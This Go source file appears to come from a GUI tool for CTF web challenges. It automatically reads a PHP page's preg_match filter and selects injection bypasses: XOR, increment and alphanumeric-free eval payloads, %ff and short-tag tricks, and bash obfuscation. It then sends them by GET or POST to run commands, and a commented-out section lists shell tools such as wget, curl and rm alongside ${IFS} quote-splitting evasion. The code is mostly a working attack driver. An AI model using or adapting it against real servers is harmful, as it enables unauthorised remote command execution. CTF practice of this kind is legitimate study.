package script

import (
	"bytes"
	"fmt"
	"io"
	"net/http"

	"regexp"
	"strings"

	"fyne.io/fyne/v2/widget"
)

func Test(URL string, Version string, command string, i string, m string) (string, string) {

	response, err := http.Get(URL)

	if err != nil {
		fmt.Println("Error creating GET request:", err)

	}

	defer response.Body.Close()

	doc, err := io.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)

	}

	lines := string(doc)
	cleanText := RemoveHTMLTags(lines)

	fmt.Printf("题目源码如下: \n" + cleanText + "\n")

	//先获取源码(不管有没有,你先获取再说)

	var guolv string
	preg_match := "preg_match"

	if strings.Contains(cleanText, preg_match) {

		fmt.Printf("发现过滤: %s\n", preg_match)

		// 使用正则表达式提取括号内的内容
		re := regexp.MustCompile(`preg_match\("([^"]+)"`)
		matches := re.FindStringSubmatch(cleanText)

		if len(matches) > 1 {
			guolv = matches[1]
			fmt.Printf("发现过滤为: %s\n", guolv)
		} else {
			re = regexp.MustCompile(`preg_match\('([^']+)'`)
			matches = re.FindStringSubmatch(cleanText)
			if len(matches) > 1 {
				guolv = matches[1]
				fmt.Printf("发现过滤为: %s\n", guolv) // 输出过滤内容及括号内的匹配内容
			} //草泥马的就你一次匹配不好使呗，那老子两次匹配就完了呗

		}
	}
	return cleanText, guolv
}

// 分eval和system对过滤进行匹配
func Damn(URL string, Version string, command string, i string, m string, cleanText string, guolv string, label *widget.Label) {

	if strings.Contains(string(cleanText), "eval") && guolv != "" {
		if strings.Contains(guolv, "a-z") && strings.Contains(guolv, "0-9") {
			//eval环境下的无数字字母分好多种
			if strings.Contains(guolv, "$") {

				fmt.Println("执行eval函数")
				fmt.Println("普通无数字字母需要利用$，这里被过滤了，只能使用进阶版")
				//无数字字母进阶的eval两种版本施工完毕
				if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, ";") {
					Version = "7"
					Noshuzievaljinjie(URL, command, Version, i, m, guolv, label)
				} else if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "`") {
					Version = "7"
					Noshuzievaljinjie(URL, command, Version, i, m, guolv, label)
				} else if !strings.Contains(guolv, ".") && !strings.Contains(guolv, "/") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "[") && !strings.Contains(guolv, "-") && !strings.Contains(guolv, "]") {
					Version = "5"
					Noshuzievaljinjie(URL, command, Version, i, m, guolv, label)
				} else {
					label.SetText("老弟你全给过滤了我咋做啊(其实要么是你菜要么是我菜不会做要么是这题无解)")
				}
			} else {

				fmt.Println("既然$没有被过滤，那么这里总共有三种方法")

				if m == "GET" && !strings.Contains(guolv, "$") && !strings.Contains(guolv, "{") && !strings.Contains(guolv, "}") && !strings.Contains(guolv, "^") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, ";") {
					fmt.Println("这是一种特殊的方法,利用%ff")
					Ff(URL, command, guolv, i, m, label)

				} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, ";") && !strings.Contains(guolv, ".") {
					fmt.Println("可以使用自增")
					Zizeng(URL, command, i, m, label)

				} else if !strings.Contains(guolv, "^") && !strings.Contains(guolv, "$") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "'") && !strings.Contains(guolv, ".") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, ";") {
					fmt.Println("可以使用异或")
					Xor(URL, command, Version, i, label)

				} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "{") && !strings.Contains(guolv, "}") && !strings.Contains(guolv, "^") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, "`") {
					fmt.Println("当这个特殊方法中分号被过滤时只能使用短标签了")
					Ff(URL, command, guolv, i, m, label)
				}
			}
		} else {
			Blacktest(guolv, m)

		}
	} else if strings.Contains(string(cleanText), "system") && guolv != "" {

		fmt.Println("执行system函数")
		booL := "0"
		Bashfuck(URL, command, guolv, i, m, label, booL)

		if booL == "0" {
			com, _ := Blacktest(guolv, "s")
			huixian := Pwd(URL, i, m, com)
			label.SetText(huixian)
		}

	} else {
		label.SetText("这是什么题目QAQ")

	}

	// {
	//感觉不如fuzz出可用的然后用(来自未来编写出fuzzpro之后的pr1nt)

	//不是无数字字母，一律是黑名单绕过

	//黑名单绕过这个知识点简单，但是脚本写起来复杂，整不明白了，代码注释后留在这，谁愿意二开添加上这个功能自己尝试吧

	//其实我能写成固定get方式发/bin/ta?${IFS}+command，然后让用户传c为flag的路径，检测flag如果被过滤就变成????,检测php如果被过滤变成???
	//如果这么写难度会骤减
	//或者写成只能传ls和tac，然后tac就上面处理方法，ls就检测没过滤直接扔，过滤就单引号绕一下

	/*
		//所有可用的函数
		heimingdan := []string{"cat", "tac", "nl", "more", "wget", "tail", "flag", "less", "head", "sed", "cut", "awk", "strings", "od", "curl", "scp", "rm", "0x20", ">", "`", "%", "x09", "x26", "<", "'", "\\", "\"", "${IFS}"}

		//将可利用函数与guolv掉的相匹配
		r := regexp.MustCompile(guolv)
		var guolv2 string

		for _, keyword := range heimingdan {
			if r.MatchString(keyword) {
				guolv2 += keyword
			} else {
				fmt.Println("可用的函数为: " + keyword)
				result += keyword
			}
		}

		var c1 string
		var c2 string
		leftIndex := strings.Index(command, "(")
		if leftIndex == -1 {
			// 字符串中没有左括号
			c1 = command
			c2 = ""
		}

		// 查找第一个右括号的索引
		rightIndex := strings.Index(command, ")")
		if rightIndex == -1 {
			// 字符串中没有右括号
			c1 = ""
			c2 = ""
		}

		if leftIndex < rightIndex {
			// 括号正确匹配，提取括号内外的内容
			//c1是括号外内容，c2是括号内内容
			c1 = command[:leftIndex]
			c2 = command[leftIndex+1 : rightIndex]

		} else {
			// 括号不正确匹配
			c1 = command
			c2 = ""
		}

		if strings.Contains(result, "'") {
			fmt.Println("单引号没被过滤，可以插函数里绕过")

			if strings.Contains(string(cleanText), "eval") {
				reURL := URL + "?" + i + "=" + c1 + "(" + c2 + ")"
				response, err = http.Get(reURL)
				fmt.Println("POC为: " + reURL)
				defer response.Body.Close()
				//上面这个eval没写，是占位的
			} else if strings.Contains(string(cleanText), "system") {
				var rec2 string
				var parts []string

				if strings.Contains(c2, " ") && strings.Contains(guolv2, "0x20") && strings.Contains(result, "${IFS}") {
					parts = strings.Split(c2, " ")
					if strings.Contains(guolv2, parts[0]) {
						c21 := parts[0][:len(parts[0])-1] // 通过切片操作删除最后一个字符
						c22 := strings.Replace(parts[0], c21, "", 1)
						rec2 = c21 + "''" + c22 + "${IFS}" + parts[1] //把两个单引号插入函数达到绕过

					}
				}//这里本来是想实现接受任一命令然后执行的

				reURL := URL + "?" + i + "=" + rec2
				response, err = http.Get(reURL)
				fmt.Println("POC为: " + reURL)
				defer response.Body.Close()
			}
		}

		body, err := io.ReadAll(response.Body)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println("回显为: " + removeHTMLTags(string(body)))
	*/
	//}
	preg_replace := "preg_replace"
	preg_match := "preg_match"
	if strings.Contains(cleanText, preg_replace) {
		//replace过滤等待施工中
		fmt.Printf("发现过滤: %s\n", preg_replace)
		fmt.Printf("题目源码如下: \n" + cleanText + "\n")
		re := regexp.MustCompile(`preg_replace\("([^"]+)"`)
		matches := re.FindStringSubmatch(cleanText)

		if len(matches) > 1 {
			guolv = matches[1]
			fmt.Printf("发现过滤为: %s\n", guolv)
		} else {
			re = regexp.MustCompile(`preg_replace\('([^']+)'`)
			matches = re.FindStringSubmatch(cleanText)
			if len(matches) > 1 {
				guolv = matches[1]
				fmt.Printf("发现过滤为: %s\n", guolv)
			}

		}

	} else if !strings.Contains(cleanText, preg_match) {
		//无源码fuzz出可用字符
		label.SetText("无源码fuzz出可用字符")
		guolv = Fuzzpro(URL, i, m)

	}

}

func GP(URL string, canshu string, m string, command string) string {
	//这是一个根据参数节省重复写GET方式和POST方式的函数

	if m == "GET" {

		reURL := URL + "?" + canshu + "=" + command

		response, _ := http.Get(reURL)
		defer response.Body.Close()
		doc, _ := io.ReadAll(response.Body)
		result := RemoveHTMLTags(string(doc))

		return result

	} else if m == "POST" {

		payload := []byte(canshu + "=" + command)

		response, _ := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
		defer response.Body.Close()
		doc, _ := io.ReadAll(response.Body)
		result := RemoveHTMLTags(string(doc))

		return result

	}
	return "error"
}

func REQUEST(URL string, canshu string, get_ string, post_ string) string {

	reURL := URL + "?" + canshu + "=" + get_
	payload := []byte(canshu + "=" + post_)

	response, _ := http.Post(reURL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
	defer response.Body.Close()

	doc, _ := io.ReadAll(response.Body)
	result := RemoveHTMLTags(string(doc))

	return result
}
